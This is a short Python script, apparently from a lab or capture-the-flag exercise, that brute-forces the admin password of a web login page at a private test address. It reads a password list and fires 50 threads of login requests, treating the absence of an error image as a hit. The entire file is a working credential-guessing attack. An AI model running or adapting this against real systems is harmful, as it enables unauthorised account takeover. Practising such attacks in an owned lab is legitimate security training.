import requests
from concurrent.futures import ThreadPoolExecutor

def try_password(password):
   url = 'http://192.168.56.102/index.php?page=signin'
   data = {
       'username': 'admin',
       'password': password,
       'Login': 'Login'
   }
   response = requests.get(url, params=data)
   if 'WrongAnswer.gif' not in response.text:
       print(f"Found password: {password}")
       return password
   return None

def bruteforce():
   with open('password.txt') as f:
       passwords = f.read().splitlines()

   with ThreadPoolExecutor(max_workers=50) as executor:
       results = list(executor.map(try_password, passwords))
       
   valid_passwords = [p for p in results if p is not None]
   return valid_passwords

if __name__ == '__main__':
   found = bruteforce()
   if found:
       print("Valid passwords:", found)